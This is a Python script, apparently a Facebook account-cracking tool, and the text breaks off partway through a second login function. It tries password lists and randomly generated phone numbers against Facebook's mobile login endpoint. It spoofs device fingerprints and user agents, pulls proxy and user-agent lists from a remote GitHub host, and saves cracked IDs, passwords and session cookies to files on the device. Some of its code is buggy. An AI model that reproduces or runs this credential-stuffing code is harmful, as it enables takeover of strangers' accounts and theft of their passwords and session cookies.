fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python MEHRO.py')
	


try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	os.system('clear'),print(' System Loading...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
logo=("""        88888888ba  8b        d8  88  
        88      "8b  Y8,    ,8P   88  
        88      ,8P   `8b  d8'    88  
        88______8P'     Y88P      88  
        88------8b,     d88b      88  
        88      `8b   ,8P  Y8,    88  
        88      a8P  d8'    `8b   88  
        88888888P"  8P        Y8  88
-----------------------------------------------
[*] Owner   :Binyamin Binni
[*] Github  :https://github.com/binyamin-binni
[*] YouTube :Trick Proof 
[*] Version : 4.4
\033[1;37m---------------------------------------------------""" )
def linex():
	print('\033[1;37m-'*51)
def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu():
        try:
                clear()
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] Crack File')
                        print(' [2] Crack Random')
                        print(' [3] Double Links Remove')
                        print(' [4] Whatsapp Group')
                        print(' [0] EXIT')
                        linex()
                        xd=input(' [~] Put Any option : ')                        
                        if xd in ['1','01']:
                                clear()
                                
                                print(' Put file example:  /sdcard/File.etc..')
                                linex()
                                file = input(' path file Put \033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('[1] METHOD (\033[1;32mNew\033[1;37m) \033[1;37m[2] METHOD (\033[1;32mOLD\033[1;37m)\033[1;37m [3] METHOD (\033[1;32mMIX\033[1;37m)')                                
                                linex()
                                mthd=input('[•] Choose : ')
                                linex()
                                clear()
                                plist = []
                                try:
                                        ps_limit = int(input(' [\033[1;32m✓\033[1;37m] HOW MANY PASSWORD DO YOU WANT TO ADD : '))
                                except:
                                        ps_limit =1
                                linex()
                                clear()
                                print('\033[1;37m[\033[1;32m✓\033[1;37m] Example : first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                clear()
                                print(' DO YOU WANT SHOW COOKIES :? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        
                                        print(' [\033[1;32m✓\033[1;37m] TOTAL IDS : \033[1;32m'+total_ids+f' ')                                        
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' [✓] Cracking Has Been Completed')
                                linex()
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' PRESS ENTER TO BACK ')
                                os.system('python QXR.py')
                        elif xd in ['2','02']:
                                pak()
                        elif xd in ['3','03']:
                                exit()
                        
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;37m [\033[1;32m✓\033[1;37m] Example : \033[1;32m0306,0315,0335,0345'),linex()
                code = input('\033[1;37m [~] PUT CODE : ')
                clear()
                try:
                        limit = int(input('\033[1;37m [\033[1;32m✓\033[1;37m] EXAMPLE: 2000, 3000, 5000, 10000\n\033[1;37m---------------------------------------------------\n\033[1;37m [~] PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as ARIX:     
                        clear()
                        
                        tl = str(len(user))
                        print(' TOTAL IDS : \033[1;32m'+tl, '  \033[1;37m| SIM CODE : \033[1;32m'+code)                        
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan1234','khan123']
                                ARIX.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' [✓] Cracking Has Been Completed')
                linex()
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python QXR.py')
#------
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BXI-M1] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua ="Dalvik/2.1.0 (Linux; U; Android 8.8.12; ROG Phone 6D Build/LMY47D)[FBAN/FB5A;FBAV/119.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/null;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ROG Phone 6D;FBSV/5.0;FBOP/1;FBCA/arm64-v8a:;]'+'Dalvik/2.1.0 (Linux; U; Android 13.9.13; PadFone E Build/TKQ1.220807.001; zh-tw)[FBAN/FB5A;FBAV/426.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/null;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/PadFone E;FBSV/5.0;FBOP/1;FBCA/arm64-v8a:;]'+'Davik/2.1.0 (Linux; U; Android 6.1.3; Realme XT Build/RMX2170_11_A.23) [FBAN/FB4A;FBAV/335.0.0.8.30;FBBV/40392643;FBDM/{density=1.5,width=1080,height=1080};FBLC/en_GB;FBCR/Robi;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/Realme XT;FBSV/6.1.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'Davik/2.1.0 (Linux; U; Android 9.1.1; Realme X7 Pro Build/RMX2020_11_A.20) [FBAN/FB4A;FBAV/416.0.0.3.131;FBBV/17559285;FBDM/{density=2.0,width=720,height=1920};FBLC/en_GB;FBCR/Airtel;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/Realme X7 Pro;FBSV/9.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'Dalvik/2.1.0 (Linux; U; Android 11.8.11; ZenFone Zoom Build/RKQ1.200710.002; zh-tw)[FBAN/FB5A;FBAV/145.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/null;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ZenFone Zoom;FBSV/5.0;FBOP/1;FBCA/arm64-v8a:;]'+'Dalvik/2.1.0 (Linux; U; Android 8.7.13; Transformer pad tf103c Build/WW_Phone-202011271133; zh-tw)[FBAN/FB5A;FBAV/186.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/null;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/Transformer pad tf103c;FBSV/5.0;FBOP/1;FBCA/arm64-v8a:;]'+'Davik/2.1.0 (Linux; U; Android 8.3.1; Realme 7i Build/RMX2170_11_A.23) [FBAN/FB4A;FBAV/363.0.0.24.48;FBBV/53660837;FBDM/{density=2.5,width=1080,height=1440};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/Realme 7i;FBSV/8.3.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'Dalvik/2.1.0 (Linux; U; Android 13.7.12; ZenFone Pegasus Build/TKQ1.220807.001; zh-tw)[FBAN/FB5A;FBAV/245.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/null;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ZenFone Pegasus;FBSV/5.0;FBOP/1;FBCA/arm64-v8a:;]'+'Dalvik/2.1.0 (Linux; U; Android 13.7.13; PadFone S Build/RKQ1.200710.002; zh-tw)[FBAN/FB5A;FBAV/182.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/null;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/PadFone S;FBSV/5.0;FBOP/1;FBCA/arm64-v8a:;]'+'Dalvik/2.1.0 (Linux; U; Android 8.7.11; CPH2519 Build/QP1A.668797.144) [FBAN/FB5A;FBAV/170.0.0.30.91;FBBV/71608355;FBDM/{density=2.2,width=1242,height=1376};FBLC/en_GB;FBRV/172917909;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2519;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'+'Dalvik/2.1.0 (Linux; U; Android 9.9.12; CPH2643 Build/QP1A.735591.213) [FBAN/FB5A;FBAV/415.0.0.30.91;FBBV/71608355;FBDM/{density=2.2,width=1242,height=1376};FBLC/en_GB;FBRV/172917909;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2643;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [OK-BXI] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                      
                                        open('/sdcard/QXR-OK-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/QXR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[2F-BXI] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [CP-BXI] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/QXR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BXI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BXI-M2] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
